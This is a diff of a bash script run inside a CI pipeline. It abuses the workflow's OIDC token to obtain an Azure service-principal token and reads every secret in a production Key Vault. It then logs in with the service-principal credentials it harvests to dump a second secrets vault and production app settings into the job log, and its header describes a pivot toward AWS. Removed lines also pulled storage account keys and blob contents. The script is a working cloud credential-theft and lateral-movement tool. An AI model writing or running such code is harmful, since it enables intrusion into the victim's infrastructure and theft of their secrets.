@@ -1,85 +1,77 @@
 #!/usr/bin/env bash
-# v2 — SP 72ff278a… có Get/List secrets trên kv-tbl-prod-x3euoz
+# v4 — pivot: OIDC -> SP CI -> kv-tbl-prod (6 SP) -> từng SP -> kv-tbl-sec-x3euoz -> AWS
 set +e
+TEN="${AZURE_TENANT_ID}"
+SEC_VAULT=kv-tbl-sec-x3euoz
+PROD_VAULT=kv-tbl-prod-x3euoz
 
 TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
   | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
 
-entra() { # $1 = scope
-  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
+tok_fed() { # $1 scope  -> token của SP CI (federated)
+  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
     -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" \
     -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
     --data-urlencode "client_assertion=${TOK}" \
   | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
 }
+tok_sp() { # $1 appId $2 secret $3 scope
+  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+    -d "client_id=$1" -d "scope=$3" -d "grant_type=client_credentials" \
+    --data-urlencode "client_secret=$2" \
+  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
+}
 
-KV=$(entra "https://vault.azure.net/.default")
-ARM=$(entra "https://management.azure.com/.default")
-echo "kv_token_len=${#KV} arm_token_len=${#ARM}"
+KV=$(tok_fed "https://vault.azure.net/.default")
+echo "ci kv token len=${#KV}"
 
-for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
-  echo "================ VAULT $V ================"
-  LIST=$(curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4")
-  echo "$LIST" | head -c 2000; echo
-  for ID in $(echo "$LIST" | python3 -c "
-import sys,json
+# --- lấy toàn bộ SP trong kv-tbl-prod
+curl -sS -H "Authorization: Bearer $KV" \
+  "https://$PROD_VAULT.vault.azure.net/secrets?api-version=7.4" > /tmp/list.json
+python3 - <<'PY' > /tmp/ids.txt
+import json
+print("\n".join(s["id"] for s in json.load(open("/tmp/list.json")).get("value",[])))
+PY
+
+: > /tmp/sps.txt
+while read -r ID; do
+  [ -z "$ID" ] && continue
+  NAME="${ID##*/}"
+  curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" > /tmp/s.json
+  python3 - "$NAME" <<'PY' >> /tmp/sps.txt
+import json,sys
 try:
-    for s in json.load(sys.stdin).get('value',[]): print(s['id'])
-except Exception: pass"); do
-    echo "--- $ID"
-    curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" | head -c 1500; echo
-    # tất cả version cũ
-    for VID in $(curl -sS -H "Authorization: Bearer $KV" "$ID/versions?api-version=7.4" | python3 -c "
+    v=json.loads(json.load(open("/tmp/s.json"))["value"])
+    print(sys.argv[1], v.get("appId",""), v.get("clientSecret",""))
+except Exception: pass
+PY
+done < /tmp/ids.txt
+echo "=== SPs ==="; cut -d' ' -f1,2 /tmp/sps.txt
+
+# --- thử từng SP vào vault bí mật
+while read -r NAME APPID SECRET; do
+  [ -z "$APPID" ] && continue
+  echo "================ SP $NAME ($APPID) ================"
+  T=$(tok_sp "$APPID" "$SECRET" "https://vault.azure.net/.default")
+  if [ -z "$T" ]; then echo "  (không lấy được token)"; continue; fi
+  for V in "$SEC_VAULT" "$PROD_VAULT"; do
+    L=$(curl -sS -H "Authorization: Bearer $T" "https://$V.vault.azure.net/secrets?api-version=7.4")
+    if echo "$L" | grep -q '"error"'; then echo "  $V: denied"; continue; fi
+    echo "  $V: OK"
+    for SID in $(echo "$L" | python3 -c "
 import sys,json
-try:
-    for s in json.load(sys.stdin).get('value',[]): print(s['id'])
-except Exception: pass"); do
-      curl -sS -H "Authorization: Bearer $KV" "$VID?api-version=7.4" | head -c 800; echo
+for s in json.load(sys.stdin).get('value',[]): print(s['id'])"); do
+      echo "  --- $SID"
+      curl -sS -H "Authorization: Bearer $T" "$SID?api-version=7.4" | head -c 1500; echo
     done
   done
-done
-
-RG=rg-tbl-platform-prod-sea
-
-echo "================ STORAGE KEYS ================"
-for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
-  echo "--- $SA"
-  KEYS=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
-   "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01")
-  echo "$KEYS" | head -c 500; echo
-  K=$(echo "$KEYS" | python3 -c "
-import sys,json
-try: print(json.load(sys.stdin)['keys'][0]['value'])
-except Exception: pass")
-  if [ -n "$K" ]; then
-    pip -q install azure-storage-blob 2>/dev/null
-    python3 - "$SA" "$K" <<'PY'
-import sys
-from azure.storage.blob import BlobServiceClient
-sa,key=sys.argv[1],sys.argv[2]
-svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key)
-for c in svc.list_containers():
-    print("  container:",c.name)
-    cc=svc.get_container_client(c.name)
-    for b in cc.list_blobs():
-        print("    blob:",b.name,b.size)
-        if b.size<200000:
-            try: print("      ",cc.download_blob(b.name).readall()[:1500])
-            except Exception as e: print("      err",e)
-PY
+  # ARM: xem SP này thấy gì
+  A=$(tok_sp "$APPID" "$SECRET" "https://management.azure.com/.default")
+  if [ -n "$A" ]; then
+    curl -sS -X POST -H "Authorization: Bearer $A" -H "Content-Length: 0" \
+     "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" | head -c 1200; echo
   fi
-done
-
-echo "================ APP SETTINGS ================"
-for SITE in app-tbl-storefront-prod app-tbl-reporting-prod; do
-  echo "--- $SITE"
-  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
-   "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-03-01" | head -c 2500; echo
-done
-
-echo "================ ROLE ASSIGNMENTS ================"
-curl -sS -H "Authorization: Bearer $ARM" \
- "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'63e87ab1-6bd2-4e80-92be-943450b20e4f'" | head -c 2000; echo
+done < /tmp/sps.txt
 
 echo "================ DONE ================"
